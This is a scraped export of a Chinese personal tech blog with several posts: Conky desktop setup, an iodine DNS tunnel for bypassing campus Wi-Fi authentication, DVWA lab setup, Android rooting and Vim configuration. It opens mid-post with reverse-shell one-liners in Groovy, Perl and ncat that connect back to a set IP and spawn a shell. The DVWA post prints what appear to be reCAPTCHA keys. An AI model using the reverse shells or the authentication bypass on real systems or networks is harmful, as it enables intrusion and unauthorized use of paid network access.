r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.1.108/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor() Perlperl -e &#39;use Socket;$i=&quot;192.168.1.108&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39; NCATNC 缺乏加密和身份验证的能力，营运而出一款支持加密的程序 NCAT；其包含于 NMAP 工具包中。 被控制端 $ ncat -c bash --allow 192.168.43.8 -vnl 4444 --ssl 控制端 $ ncat -nv 192.168.43.218 4444 --ssl Reference linux各种一句话反弹shell总结 为什么应该在 Linux 上使用命名管道","categories":[],"tags":[{"name":"nc","slug":"nc","permalink":"https://fanqxu.github.io/tags/nc/"}],"author":"F4n9X"},{"title":"Ubuntu Conky折腾笔记","slug":"conky-ubuntu","date":"2019-04-03T10:17:30.000Z","updated":"2020-04-12T14:25:57.000Z","comments":true,"path":"2019/04/03/conky-ubuntu/","link":"","permalink":"https://fanqxu.github.io/2019/04/03/conky-ubuntu/","excerpt":"Linux 系统属于开源软件，它并非开箱即用的商业产品（Windows，MacOS）。其桌面系统需要大量的定制、美化、优化，才能用起来舒畅顺滑；这也可能是无数初学者初试受挫，并最终放弃的主要原因。 OG完美主义者","text":"Linux 系统属于开源软件，它并非开箱即用的商业产品（Windows，MacOS）。其桌面系统需要大量的定制、美化、优化，才能用起来舒畅顺滑；这也可能是无数初学者初试受挫，并最终放弃的主要原因。 OG完美主义者 所以本文就 Ubuntu 桌面美化的一次折腾做一个小笔记。 说到桌面美化，就得聊到动态监视器 Conky。 Conky 是什么 | What？ Github: https://github.com/brndnmtthws/conky Youtube: https://www.youtube.com/watch?v=bHtpLEoRKmg&amp;t=19s 其实，简单来说。Conky 是一款免费的轻量级系统监视器，可以在桌面上显示任何类型的信息。 特性 | Features据官方 README.md，其可显示300+个内置对象，包括支持： 大量操作系统统计数据 内核、运行时间、CPU使用、内存使用、磁盘使用、网络…… 内置 IMAP 和 POP3 可使用内置的 Lua 支持或自己的脚本和程序进行扩展 内置 Imlib2 和 Cairo 支持 OS Linux、FreeBSD、OpenBSD、Solaris 和 macOS…… 不好意思，真没 Windows…… …… 可以以文本形式显示信息，也可使用简单的进度条和图形小部件以及不同的字体和颜色显示信息。 快速开始 | Quickstart安装 | Install介于我的是 Debian 系，直接使用 APT 包管理安装；其他发行版本自行解决吧！ $ sudo apt install conky-all 配置 | Configuration其实，主要就是一份流弊的配置文件。 关于我的配置文件，其实是 @Lunatic 在网上收集并修改的。他首先是先在其 Arch 上完美运行，之后发布至 Github 个人仓库。 由于他是 Arch，我使用他的配置文件并不能完美滴在我的系统上展现出来。 又过来很长一段时间，我又发现一位 Arch 用户@纤魂 已将 Lunatic 的配置文件魔改滴很到位，将其安装方式改的更加的简单，一个脚本的事。 随后，我就将纤魂的那个关于配置文件的仓库 fork 到我的仓库下，并作出一些变动；将 Arch Logo 删掉，并修改了启动脚本。希望有后来者可折腾出更流弊的配置文件。 Lunatic https://github.com/9527tech/conkyrc 纤魂 https://github.com/AsucreYau/conkyrc 本人 Forked From AsucreYau/conkyrc https://github.com/FanqXu/conkyrc 如果你是 Ubuntu/Debian 用户，你可以试试将本人的仓库克隆至本地；Arch 用户直接看他两的仓库吧；其他系的，如果使用的是 Gnome 桌面，也可试着来吧。 $ git clone https://github.com/FanqXu/conkyrc.git 然后进入此目录开始执行安装脚本。 $ cd conkyrc $ ./install.sh 然后就 OK 了，如果不行就执行一条命令或者重新登录桌面。 $ source ~/.xprofile 关于启动脚本，以后每次开机后的5秒后开始启动 Conky 配置文件。 $ bat startconky.sh ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: startconky.sh ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ killall conky 4 │ 5 │ # time (in s) for the DE to start; use ~20 for Gnome or KDE, less for Xfce/LXDE etc 6 │ sleep 5 7 │ 8 │ # the main conky with rings 9 │ conky -c ~/.config/conky/rings --daemonize --quiet --pause=7 10 │ 11 │ # time for the main conky to start; needed so that the smaller ones draw above not below (probably can be lower, but we still have to wait 5s for the rings to avoid segfaults) 12 │ sleep 1 13 │ 14 │ conky -c ~/.config/conky/cpu --daemonize --quiet 15 │ conky -c ~/.config/conky/ram --daemonize --quiet 16 │ conky -c ~/.config/conky/network --daemonize --quiet 17 │ conky -c ~/.config/conky/disk --daemonize --quiet 18 │ conky -c ~/.config/conky/clock --daemonize --quiet ───────┴─────────────────────────────────── 截屏 | Screenshot 定制化 | Customized这份 conky 配置文件是可以自己微调滴！不过需要会看懂 conky 配置文件的特定格式。 例如 clock 文件中的： gap_x = 1100, gap_y = 645, clock_rings.lua 中的： x=160, y=155, x=160, y=155, ...... 等等……这些都是调整在屏幕中的位置的。 不仅如此，还可以调整一些其他属性，比如颜色、大小等等 …… 最后 | Finally希望能够见到更流弊的 Conky 桌面吧！！！ Reference https://mp.weixin.qq.com/s/powz0x…… https://github.com/brndnmtthws/conky https://github.com/9527tech/conkyrc https://github.com/AsucreYau/conkyrc https://github.com/FanqXu/conkyrc","categories":[{"name":"技术","slug":"技术","permalink":"https://fanqxu.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"conky","slug":"conky","permalink":"https://fanqxu.github.io/tags/conky/"}],"author":"F4n9X"},{"title":"DNS隧道绕过校园网认证","slug":"Bypass-campusNet","date":"2019-03-20T12:53:36.000Z","updated":"2020-04-29T15:57:10.000Z","comments":true,"path":"2019/03/20/Bypass-campusNet/","link":"","permalink":"https://fanqxu.github.io/2019/03/20/Bypass-campusNet/","excerpt":"","text":"本文在绝大数人眼里或许是篇福利文；在此文中介绍如何通过 DNS TUNNEL 的方式来绕过校园网认证，实现免认证免费上网；或许此招式并不是最优解，但对于绝大多数校园认证网确实能够成功实现。 怎么说呢！其实我早盯上了校园网了。 场景分析 / Scene Analysis吐槽在某所高校中，存在一家网络运营商，主要面向毫无收入的学生们，为汝等提供日常上网冲浪。 其特点就是三字：贵、差、抠😒。每月79RMB的高昂费用；网络质量差，打游戏经常460；还特么只让三个设备使用，这点或许也可通过某种方式（MAC地址）绕过。 没办法，我虽不用此校园网，但还是看不下去，遂有了本文。 信息收集在这所高校的网络中，统一使用的是 WiFi 热点客户端认证方式；当连上 WiFi 后，本机会向 DHCP 服务器获取一个内网 IP；关于这个 IP 地址，起初还让我很是疑惑，没想到在资源如此匮乏的大天朝，此运营商还会分一个公网 IP 给俺； 后来才知道这是个保留地址，详见其 维基百科 。 Address block Scope Description 100.64.0.0/10 私有网络 共享地址空间 在未认证前还会弹出一个下载认证客户端软件的页面，这里所用到的恶心技术就是利用 HTTP 协议的缺陷，当我们访问一个 HTTP 的网站时，网关会对这个响应报文劫持篡改，给我们302重定向到一个指定的下载认证客户端页面。而当我们打开一个 HTTPS 类型的网站是不可能被劫持的。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hl1kyhaj30pa0h7ab7.jpg\" 上图就是重定向后的客户端下载页面，让我匪夷所思的是最上面的那个位置本该是一个域名，为何是个公网 IP。既然没有使用域名，那何必需要 DNS，何不直接关闭53端口，为何让我如此这般有机可乘；实在让我百思不得其解🤔。 由下图可得知，DNS 53端口是开启的。 原理简述原理其实很简单。由上述信息得知，校园网认证过程一般需要放行 DNS 和 DHCP 报文，也就是53和67/68端口。53端口既可以是 UDP，也可是 TCP；67/68端口走的是 UDP 传输协议。 本文着重点是 DNS 53端口，其实 UDP 67也可以绕过认证；但本文将围绕 DNS 53来实现绕过认证，不讨论后者。 而在这个53端口中，网关/防火墙如果不进行报文检查，那么就也将意味着，任何数据包都可以通过此端口传输；如果真的是这样的话，那就很简单了，直接 openVPN 架起，详见此文 利用openVPN实现udp53,67,68端口绕过校园网认证上网 。 但是，恰巧不幸的是，这种情况是很少存在的，也就是说53端口仅只允许 DNS 报文通过。如果是这种情况，还是有办法的。办法就是，使用 DNS 隧道。 简单来讲，既然53端口的 DNS 数据包可以通过网关/防火墙，那么就可以在本机运行一个程序，用来将其他端口数据包伪装成 DNS 数据包，发送到本地 DNS 服务器，这样网关/防火墙也不会进行拦截。但是这样仅只是将数据发送出去，如何回来呢？回来需要两个东西，一个是 VPS ，另一个就是域名。还得在域名购买商那里做如下解析设置： 主机记录 类型 值 NS d2t tunnel.fanqxu.com A tunnel 148.70.218.239 以上，d2t 和 tunnel 可以随意命名；另外，VPS 公网 IP 为148.70.218.239。还有一点就是 VPS 是某马家的学生云，在此文发布之后，或可能未续费而停掉。意思就是说，不要想着搞我服务器了，虽然公网 IP 暴露了。 然后步入正题做个假设，我们在本机 PC 上将数据包伪装成 DNS 数据，且向本地 DNS 服务器指定将要查询一个域名，而本地域名服务器收到数据后，并不能成功解析，便只能将此数据包进行转发，转发到哪里呢？请注意上表中的 NS 记录，就是用来指定一个域名由 VPS 来进行解析；所以毫无疑问，数据包顺利地到达服务器。接下来我们同样可以在 VPS 上运行一个同样的程序，用来对伪装的数据包来进行还原，然后再将还原的数据包发送到互联网中。再然后服务器就会收到回来的响应数据包，再对此响应包进行 伪装成 DNS 响应数据包，按照过来的路径，反向地将伪装好的 DNS 响应数据包发送到本机 PC，PC 收到 DNS 伪装响应包后，再对其进行还原，最终达到本机 PC 收到真正需要的数据包。 开始实战 / Start Combat所需 VPS Ubuntu 16 serevr 带宽 1 Mbps IP 148.70.218.239 Domain fanqxu.com 主机记录 记录 值 NS d2t tunnel.fanqxu.com A tunnel 148.70.218.239 PC Ubuntu 18 desktop 伪装程序前面谈原理的时候，说到需要一个对数据包做 DNS 伪装的程序。而这个实现这种功能的程序有很多。 就拿我用过的两款软件来说，第一个是 dns2tcp，第二个，也就是要说的主角就是 iodine。由于前者相较于后者较复杂，使用未成功，故弃之，主要说后者。 这个小工具可以通过 DNS 服务器对 IPv4 数据进行隧道传输。有时候防火墙禁止了其他类型的流量时，而 DNS 查询流量却未被禁用时，此时就可以用来传输正常 IPv4 流量。 这个工具其实是攻击者用来通过 DNS 隧道来反弹 shell 滴！不过我是拿来突破校园网认证。 Github：https://github.com/yarrick/iodine 服务器由于是 Debian 系，所以安装特简单。 $ sudo apt-get install iodine 然后运行起来 $ sudo iodined -f -c -P password 10.0.0.1 d2t.fanqxu.com 参数解释： -f 前台运行 -c 禁用检查所有传入请求的客户端IP地址；默认情况，来自不匹配IP请求将被拒绝。 -P 设置认证密码 后面那个 IP 得是一个保留地址，再然后跟一个所要查询的域名。就这样让程序在 VPS 后台运行着。 客户端同样是 Debian 系，安装方法同样。 $ sudo apt-get install iodine 然后运行着，不要停止。 $ sudo iodine -f -P password d2t.fanqxu.com 再然后，通过 ssh 服务器，使用9999端口来作为转发端口。 ssh ubuntu@10.0.0.1 -D 9999 不用很久，就会登录到服务器。 当出现上图标记的那段文字，即为成功。 代理开启系统自带代理 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19ho5btdmj30j90dljrj.jpg\" 或者使用浏览器插件 SwitchyOmega（墙裂推荐） Github：github.com/FelisCatus/SwitchyOmega class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hohv40aj30vk0i7mxr.jpg\" 代理服务器即本机，端口9999。 测试 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hor8njfj30l80c9mxi.jpg\" 质量 / Quality关于网速我绕过认证次数总共两次，第一次是在凌晨接近2点左右，那时候网速还行；而第二次在在写这篇文章的白天下午，速度是出了奇的慢，打开个百度将近十秒钟。 另外，也和我的 VPS 出口带宽有莫大的关系；毕竟只有1Mbps。 未遵循标准的结果TCP/IP 四层体系结构已明确规定各个协议的作用，如果非要在不该传输正常数据的端口中传输一切数据，那结果也可想而知。 Reference UDP 53 免费上网、DNS 隧道经验谈 利用openVPN实现udp53,67,68端口绕过校园网认证上网","categories":[],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://fanqxu.github.io/tags/DNS/"}],"author":"F4n9X"},{"title":"Web渗透平台DVWA搭建","slug":"DVWA","date":"2019-01-14T06:52:04.000Z","updated":"2020-04-12T14:25:47.000Z","comments":true,"path":"2019/01/14/DVWA/","link":"","permalink":"https://fanqxu.github.io/2019/01/14/DVWA/","excerpt":"","text":"环境： 物理机 Ubuntu 18.04 desktop VirtualBox 5.2.18_Ubuntu 服务器 Ubuntu 16.04 server DVWA https://github.com/ethicalhack3r/DVWA http://dvwa.co.uk/ class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6qy79j30rk0lygms.jpg\" 此文分为三部分，第一部分为服务器的安装，第二部分为基本环境配置，第三部分为 DVWA 的部署。 0x00 安装 Ubuntu 服务器将 Ubuntu 16.04 server 安装至 VirtualBox ，当然安装到 VMware 中也行；其中一些简单的步骤并为截图。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6py3yj30hs0dcglg.jpg\" 我的主机名，**webServ** class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6pvaxj30m80goq2r.jpg\" 设置用户名，亲测 admin 不可以 😂 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6q9v5j30m80godfo.jpg\" 不要加密家目录 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6tdecj30m80go0sk.jpg\" 将更改写入磁盘 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6tk6bj30m80go744.jpg\" 不自动更新 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6t30lj30m80go745.jpg\" 这里是重点，需选择如图所示三项，其中 LAMP 即分别为 Linux 、Apache、MySQL、PHP。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6uw1hj30m80goglg.jpg\" 设置 MySQL 的 root 密码 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6xcrbj30m80goq2r.jpg\" 完成安装后重启 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6xlidj30m80gowec.jpg\" 本地物理机 ssh 连上服务器 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz60cpy7jdj31cj0jgwni.jpg\" 0x01 基本环境配置卸载 PHP7由于我们需要的是 PHP5 ，故通过下面一条命令将之前安装系统时装的 LAMP 中的 PHP7 卸载掉。 $ sudo apt-get purge `dpkg -l | grep php| awk &#39;&#123;print $2&#125;&#39; |tr &quot;\\n&quot; &quot; &quot;` 安装 PHP5添加 PHP5 的 ppa 源 $ sudo add-apt-repository ppa:ondrej/php 更新索引 $ sudo apt-get update 更新系统所有软件 $ sudo apt-get upgrade 安装 PHP5 $ sudo apt-get install php5.6 依赖性安装依赖 $ sudo apt-get install php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml 再次查看 PHP 版本 $ php -v PHP 5.6.40-1+ubuntu16.04.1+deb.sury.org+1 (cli) Copyright (c) 1997-2016 The PHP Group Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies Apache开启 Apache 服务 $ sudo service apache2 start 完成后可以打开本地网页查看 Apache 服务是否正常，此处的 URL 为服务器的 IP 地址。 http://192.168.43.218 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv70dvtj30vg0n83zw.jpg\" 启用 Apache 中的 PHP5.6 模块 $ sudo a2enmod php5.6 perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_PAPER = &quot;zh_CN.UTF-8&quot;, LC_ADDRESS = &quot;zh_CN.UTF-8&quot;, LC_MONETARY = &quot;zh_CN.UTF-8&quot;, LC_NUMERIC = &quot;zh_CN.UTF-8&quot;, LC_TELEPHONE = &quot;zh_CN.UTF-8&quot;, LC_IDENTIFICATION = &quot;zh_CN.UTF-8&quot;, LC_MEASUREMENT = &quot;zh_CN.UTF-8&quot;, LC_CTYPE = &quot;en_US.UTF-8&quot;, LC_TIME = &quot;zh_CN.UTF-8&quot;, LC_NAME = &quot;zh_CN.UTF-8&quot;, LANG = &quot;en_US.UTF-8&quot; are supported and installed on your system. perl: warning: Falling back to a fallback locale (&quot;en_US.UTF-8&quot;). Considering dependency mpm_prefork for php5.6: Considering conflict mpm_event for mpm_prefork: Considering conflict mpm_worker for mpm_prefork: Module mpm_prefork already enabled Considering conflict php5 for php5.6: Module php5.6 already enabled 重启 Apache 服务 $ sudo service apache2 restart 0x02 DVWA 部署下载下载 DVWA 到本地服务器 $ sudo wget https://github.com/ethicalhack3r/DVWA/archive/master.zip 解压到相应目录 $ sudo apt-get install unzip $ sudo unzip DWVA-master.zip -d /var/www/html/dvwa 这时就可以打开 Web 界面 http://192.168.43.218/DVWA/setup.php class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv6zixuj30vd0n8glo.jpg\" 提示需将一个配置文件修改名字 $ cd /var/www/html/dvwa/config/ $ sudo mv config.inc.php.dist config.inc.php 再次打开 Web 界面 选项及 PHP 模块 gd 此后，就根据Web界面的提示依次完成相应配置 开启 allow_url_include， $ sudo vi /etc/php/5.6/apache2/php.ini 开启这个就可让 include include_once require 和 require_once 都能用 url 和伪协议 allow_url_include = On 安装 PHP 的一个模块 $ sudo apt-get install php5.6-gd 打开 Web 界面查看 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv72obbj30p50pjgmk.jpg\" 秘钥下一个就是 reCAPTCHA key，这个就有点麻烦，可能得需一个Google账号加科学上网。首先打开 dvwa 目录下的 config 目录下的一个配置文件。 $ sudo vi dvwa/config/config.inc.php 打开后找到一下字段…… # ReCAPTCHA settings # Used for the &#39;Insecure CAPTCHA&#39; module # You&#39;ll need to generate your own keys at: https://www.google.com/recaptcha/admin $_DVWA[ &#39;recaptcha_public_key&#39; ] = &#39;&#39;; $_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;&#39;; 按照提示，打开以上那个链接…… https://www.google.com/recaptcha/admin Label 栏里就填上 DVWA ，然后勾选 reCAPTCHA v3 以及 Accept ，最后点击 Register 。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv71o9oj30ez0modg5.jpg\" 将秘钥复制到配置文件中的相应位置， class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv71mojj30qt0lzwf5.jpg\" $_DVWA[ &#39;recaptcha_public_key&#39; ] = &#39;6LfKd4kUAAAAAEk6g_eoecny__1zZwdknXuE2Lju&#39;; $_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;6LfKd4kUAAAAAECiwIiv5nrmh_k75TsKabJt0f3W&#39;; 保存退出，刷新页面就会看到生效。 目录可写权将上面三个目录修改可写权限 $ sudo chgrp www-data /var/www/html/dvwa/hackable/uploads/ $ sudo chgrp www-data /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt $ sudo chgrp www-data /var/www/html/dvwa/config/ 数据库密码最后，还有一个小问题就是关于数据库的密码，还是打开那个配置文件 $ sudo vi dvwa/config/config.inc.php 找到以下字段 $_DVWA = array(); $_DVWA[ &#39;db_server&#39; ] = &#39;127.0.0.1&#39;; $_DVWA[ &#39;db_database&#39; ] = &#39;dvwa&#39;; $_DVWA[ &#39;db_user&#39; ] = &#39;root&#39;; $_DVWA[ &#39;db_password&#39; ] = &#39;p@aap0rd&#39;; 重点是最后这一项，将引号中的密码设置为之前设置的 MySQL 数据库密码 $_DVWA[ &#39;db_password&#39; ] = &#39;toor&#39;; 而不是设置为空密码，若设置为空密码，点击 Create/Reset Database 就会出现**不能连接 MySQL 服务** 。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv70oqfj30ij068gli.jpg\" 设置正确后再次点击 Create/Reset Database class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv738f1j30if0baweg.jpg\" 点击登录，默认用户名 admin 密码 password class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv73s7xj30fa09imx2.jpg\" class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv76466j30p40m1dhf.jpg\" 完成！！！","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://fanqxu.github.io/tags/Web/"}],"author":"F4n9X"},{"title":"Android Root及后操作","slug":"mi5s-magisk","date":"2019-01-03T15:15:40.000Z","updated":"2020-04-15T13:49:36.000Z","comments":true,"path":"2019/01/03/mi5s-magisk/","link":"","permalink":"https://fanqxu.github.io/2019/01/03/mi5s-magisk/","excerpt":"其次，高可玩性得益于 Android 的开源。此文章仅算入坑，适合爱折腾的小白朋友；Android 机拿到最高权限的思路都类似，同是安卓机，即可借鉴。 高可玩性，是有了 root 管理权后的自由，所以便有了此文。","text":"其次，高可玩性得益于 Android 的开源。此文章仅算入坑，适合爱折腾的小白朋友；Android 机拿到最高权限的思路都类似，同是安卓机，即可借鉴。 高可玩性，是有了 root 管理权后的自由，所以便有了此文。 环境： 代号 capricorn 的 Mi 5S MIUI 10 Android 7.0 前期准备： Windows 系统（最好不要使用虚拟机） USB 数据线 需登录小米账号 电量得足，最好100% 手机上开启 USB 调试 关于如何开开启 USB 调试，打开【设置】&gt;&gt;&gt;【我的设备】&gt;&gt;&gt;【全部参数】&gt;&gt;&gt;【MIUI 版本】连续点击6下，回到【设置】首页，进入【更多设置】&gt;&gt;&gt;【开发者选项】，找到并点亮USB调试。 ## Bootloader解锁 小米手机解锁申请： http://www.miui.com/unlock/index.html 申请成功后，将解锁工具下载并解压到本地，打开可以看到以下文件 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytse7q9w1j30kg0f475t.jpg\" 由于我不是Windows系统，所以窗口和图标有所不同，但文件名都相同；其中 driver_install_64.exe 一个为64位的Windows安装驱动的文件 MiUsbDriver.exe 为安装USB驱动文件 miflash_unlock.exe 即为解锁文件 其他暂不用关心，将你的电脑与手机用数据线连接起来； 打开顺序，先把驱动安装完，然后打开解锁文件miflash_unlock.exe。 如图，首先打开工具登录查询： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsfun2t8j30fa08vaaf.jpg\" class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsg5oqq0j30fa0ahmx8.jpg\" 其次，进入Fastboot模式，开始解锁 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsgly5rsj30fa0aiweo.jpg\" class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsh34r48j30fa0ahq35.jpg\" 验证 关于*Android*机，能把*Bootloader*锁了的，基本上都可以拿到*root*管理权。所以这一步成功了，后面的基本都不用担心了，问题都不大。 刷入TWRP 关于TWRY，它是一个替换系统自带Recovery模式的工具，由于系统自带的Recovery模式功能太简陋。 这里暂且不较真将它简单地认为为电脑的 BIOS 。 官网：https://twrp.me 下载（此链接仅适用于capricorn）：https://dl.twrp.me/capricorn/ 先将其最新版本下载到本地计算机，它的名称就像twrp-x.x.x-x-capricorn.img。建议将其放入之前那个小米解锁工具的文件夹中。 进入 FASTBOOT然后，打开你的Windows中的CMD，切换当前路径为那个解锁工具的目录，然后使用以下命令将其重启到**FASTBOOT**模式。 adb reboot bootloader 如果不懂上面这种方法，你还可以通过组合键到 FASTBOOT 模式； 重启设备，在进入开机的开始，按住Volume Down+Power，直至屏幕上出现 FASTBOOT。 成功进入后，你还可以通过以下命令验证电脑是否找到手机 fastboot devices 刷入 TWRYfastboot flash recovery twrp-x.x.x-x-capricorn.img 注意命名 验证同时按住 音量上键 ＋ 电源键 ，没有进入 TWRY 的 Recovery 模式界面绝不要松手，直到进入 TWRY 的 recovery 界面为止。如下图，即为成功： ## 安装Magisk 关于Magisk，其强大的功能，使得我们普通玩家足以与厂商进行博弈。还是开源的，很给力。 Magisk仓库：https://github.com/topjohnwu/Magisk 其功能： 集成 root SafetyNet root 和 Magisk 的日志功能 Magisk Hide（隐藏 Magisk 的 root 权限） systemless hosts（广告屏蔽） Magisk 模块（例如，Xposed） Magisk工具包下载：https://pan.baidu.com/s/1ixJnljXY1mIgUWjk5FkYBQ 提取码: d8fy 安装下载上面的工具包，将其中的Magisk-v18.0.zip复制到手机的 /sdcard 目录下，然后重启到Recovery模式下，安装这个zip包，找到这个包，然后滑动滑块，开始刷入…… 完成后重启，在桌面上可以找到`Magisk Manager`，这个是`Magisk`的管理工具。 至此，你就拿到了设备的root管理权 Xposed 框架 Xposed框架（Xposed framework）可以在不修改APK文件的情况下修改程序的运行（修改系统），基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作。 ——Wikipedia 简单来讲，Android 手机弄上了这个框架才能成为真正的神机；手机上的一切骚操作都离不开这个 Xposed 框架。 在这个框架下，可以加载很多插件，来直接或间接操控系统及第三方 App 软件（术语叫hook） 可以仅在手机上就能实现一些非常厉害的操作，例如： 秒抢红包 阻止消息撤回 个性化、优化各类App 等等 当然不止这些功能…… 安装 由于Xposed的官方版本最新的版本停留在Android 8.0/8.1 beta3版本（即v90-beta3），因此新机高于此Android版本的： Android Q (10)[sdk29] Android Pie (9)[sdk28] Android Oreo (8.x)[sdk26/27] 我建议安装 EdXposed 框架。 本质和实现功能是一样的。 首先先在前面已经安装 Magisk 的基础上， 先安装 Riru-Core 模块； 然后再安装 EdXposed (YAHFA)； 最后安装 EdXposed Manager； 重启设备就OK了。 推荐模块 微X模块 QNotified YouTube去广告 绿色守护 ⚠️⚠️⚠️安装错误的 Xposed 模块，可能会导致手机开机无法进入系统或者坏掉，如果进不了系统可以进入 TWRP 关闭 Magisk ！（本人就碰到过） 所以一定一定要谨慎食用！！！","categories":[],"tags":[{"name":"root","slug":"root","permalink":"https://fanqxu.github.io/tags/root/"}],"author":"F4n9X"},{"title":"Vim 搭建 Python 开发环境入坑","slug":"linux-vim-python","date":"2018-12-13T10:34:48.000Z","updated":"2020-04-12T14:17:14.000Z","comments":true,"path":"2018/12/13/linux-vim-python/","link":"","permalink":"https://fanqxu.github.io/2018/12/13/linux-vim-python/","excerpt":"","text":"0x00 先说一下我的环境 OS : Ubuntu18.04 Python 3.6.7 $ sudo apt install python3 pip 18.1 $ sudo apt install python3-pip Vim 8.0 + $ sudo apt install vim 0x01 版本检查如果你的操作系统已经安装了 vim ，你需要先检查一下它的版本；尽可能的将你的 vim 升级到新版本（*vim 8.0+*），否则可能会影响后续操作，出现版本不兼容之类的问题。 $ vim --version class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy50msk0xlj30y40qwe81.jpg\" 如上图所示，就算正常了。 0x02 Vim 安装若安装的版本不对，那么先卸载它，然后重新安装 $ sudo apt purge vim 注：使用 purge 可将其配置文件一并移除掉，比 remove 移除的更加干净。 如果没有安装 vim ，那就这个样子 $ sudo apt install vim 0x03 插件管理器 即 Vundle ，是 Vim bundle 的缩写，一个广泛使用的插件管理器。 Github 仓库：https://github.com/VundleVim/Vundle.vim 安装先安装一个分布式版本控制系统$ sudo apt install git 然后将其克隆到本地$ git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 请注意大小写，这条命令就是将 Vundle 克隆到本地的 ~/.vim/bundle/ 目录下 配置文件回到你的家目录，创建 vim 的配置文件 .vimrc ，然后编辑它 $ cd ~ &amp;&amp; touch .vimrc &amp;&amp; gedit .vimrc 再然后，将下面这一段复制到配置文件 .vimrc 中，其中的 “ 相当于一般的配置文件中的 # ，在一段中，*”* 后面的语句都算注释语句，不生效；第十一行空着的目的就是，如果以后你想再添加其他的插件，那么其语句都应在空着的这行之中。 set nocompatible &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本 filetype off &quot; 必须要添加 set rtp+=~/.vim/bundle/Vundle.vim &quot; 设置包括vundle和初始化相关的runtime path call vundle#begin() &quot; 另一种选择, 指定一个vundle安装插件的路径 &quot;call vundle#begin(&#39;~/some/path/here&#39;) &quot; 让vundle管理插件版本,必须 Plugin &#39;gmarik/Vundle.vim&#39; &quot; 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin) &quot; 你的所有插件需要在下面这行之前 call vundle#end() &quot; 必须 filetype plugin indent on &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本 开始安装了安装这里有点绕，其实就是在终端打开 vim ，在命令模式（也就是直接进去的状态）下输入下面这条命令回车，这里得提供一下动态图，看图。 :PluginInstall class=\"lazyload\" 